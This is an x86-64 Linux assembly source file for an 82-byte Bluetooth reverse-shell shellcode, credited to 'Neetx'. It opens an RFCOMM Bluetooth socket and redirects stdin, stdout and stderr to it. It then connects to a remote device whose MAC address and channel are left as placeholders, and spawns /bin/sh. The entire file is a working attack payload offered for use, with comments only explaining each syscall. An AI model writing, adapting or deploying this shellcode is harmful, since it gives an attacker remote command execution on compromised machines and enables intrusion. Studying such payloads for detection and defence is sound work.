; 82 byte bluetooth reverse shell for linux/x86-64
; Neetx
global _start
section .text
_start:	
    bits    64
    
    ; create a socket
    ; socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM)
    push    41		;socket syscall
    pop     rax	
    push    1		;socket type
    pop     rsi
    push    31		;socket family
    pop     rdi
    push 	3		;protocol
	pop 	rdx
    syscall
    
    xchg    eax, edi         ; edi = s
    
    ; assign socket handle to stdin,stdout,stderr
    ; dup2 (s, STDIN_FILENO)
    ; dup2 (s, STDOUT_FILENO)
    ; dup2 (s, STDERR_FILENO)

	push 2
	pop si				 ;stderr, decremented --> stdout --> stdin
dup_loop64:
    mov     al, 33           ; rax = sys_dup2
    syscall
    sub     esi, 1           
    jns     dup_loop64       ; jump if not signed
    
    ; connect to remote host
    ; connect (s, &sa, sizeof(sa));

	xor rcx,rcx				 ;clean
	mov cl, 0x03			 ;3 channel, CHANNEL HERE
	push rcx
	mov rcx, ~0xXXXXXXXXXXXX001f		;MAC HERE + filler + family(1f=31)
	not rcx
	push rcx


	push rsp				 ;push sockaddr_rc pointer
	pop rsi					 ; &sa
	mov     dl, 10           ; rdx = sizeof(sa)
	xor rax,rax
    mov     al, 42           ; rax = sys_connect
    syscall    
    
    ; execute /bin/sh
    ; execv("/bin//sh", 0, 0);
  	xor		rdx, rdx
    push    rdx
    pop     rsi              ; rsi=0
    push    rdx              ; zero terminator
    mov     rcx, '/bin//sh'
    push    rcx
    push    rsp
    pop     rdi    
    mov     al, 59           ; rax = sys_execve
    syscall

